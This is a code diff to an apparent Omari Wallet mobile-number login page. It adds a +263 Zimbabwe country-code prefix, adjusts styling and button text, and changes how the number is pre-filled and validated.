@@ -113,28 +113,58 @@
             width: 100%;
             position: relative;
             margin-bottom: 8px;
+            display: flex;
+        }
+
+        .country-code {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f0f0f0;
+            border: 2px solid #e0e0e0;
+            border-right: none;
+            border-radius: 14px 0 0 14px;
+            padding: 0 16px;
+            flex-shrink: 0;
+            gap: 8px;
+        }
+
+        .flag {
+            width: 24px;
+            border-radius: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .code-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: #4DB848;
         }
 
         .number-input {
             width: 100%;
             height: 58px;
             border: 2px solid #e0e0e0;
-            border-radius: 14px;
+            border-radius: 0 14px 14px 0;
             font-size: 22px;
             font-weight: 700;
-            text-align: center;
             color: #1b3a1c;
             background: #f9f9f9;
             outline: none;
-            letter-spacing: 3px;
+            letter-spacing: 2px;
             transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
             caret-color: #4DB848;
+            padding-left: 14px;
+        }
+
+        .input-wrap:focus-within .country-code,
+        .input-wrap:focus-within .number-input {
+            border-color: #4DB848;
         }
 
         .number-input:focus {
-            border-color: #4DB848;
             background: #fff;
-            box-shadow: 0 0 0 3px rgba(77,184,72,0.15);
+            box-shadow: 0 0 0 3px rgba(77,184,72,0.15) inset;
         }
 
         .number-input.invalid {
@@ -251,7 +281,7 @@
 <!-- Loading overlay -->
 <div class="loading-overlay" id="loadingOverlay">
     <div class="spinner"></div>
-    <p>Sending OTP…</p>
+    <p>Logging in…</p>
 </div>
 
 <div class="app">
@@ -270,13 +300,17 @@
         <div class="subtitle">Enter your Omari Wallet mobile number to receive a one-time verification code.</div>
 
         <div class="input-wrap">
+            <div class="country-code">
+                <img src="https://flagcdn.com/w40/zw.png" alt="Zimbabwe" class="flag">
+                <span class="code-text">+263</span>
+            </div>
             <input
                 id="numberInput"
                 class="number-input"
                 type="tel"
                 inputmode="numeric"
-                placeholder="0771234567"
-                maxlength="15"
+                placeholder="771234567"
+                maxlength="10"
                 autocomplete="tel"
             >
         </div>
@@ -284,7 +318,7 @@
         <div class="error-msg" id="errorMsg"></div>
 
         <button class="btn-continue" id="continueBtn">
-            <span>Send OTP</span>
+            <span>Login</span>
             <span>→</span>
         </button>
 
@@ -308,7 +342,11 @@ document.addEventListener('DOMContentLoaded', () => {
     // Pre-fill from submitted loan data if mobile already in storage
     const submitted = JSON.parse(localStorage.getItem('omariSubmittedLoan') || 'null');
     if (submitted && submitted.mobile) {
-        numberInput.value = submitted.mobile;
+        let savedNum = submitted.mobile;
+        // Strip 263 or 0 from start if they exist
+        if (savedNum.startsWith('263')) savedNum = savedNum.substring(3);
+        else if (savedNum.startsWith('0')) savedNum = savedNum.substring(1);
+        numberInput.value = savedNum;
     }
 
     // Only allow digit input
@@ -320,12 +358,12 @@ document.addEventListener('DOMContentLoaded', () => {
 
     function validate() {
         const val = numberInput.value.trim();
-        if (val.length < 7) {
+        if (val.length < 8) {
             numberInput.classList.add('invalid');
             errorMsg.textContent = 'Please enter a valid mobile number.';
             return null;
         }
-        return val;
+        return '263' + val; // Return full number for consistency
     }
 
     continueBtn.addEventListener('click', () => {
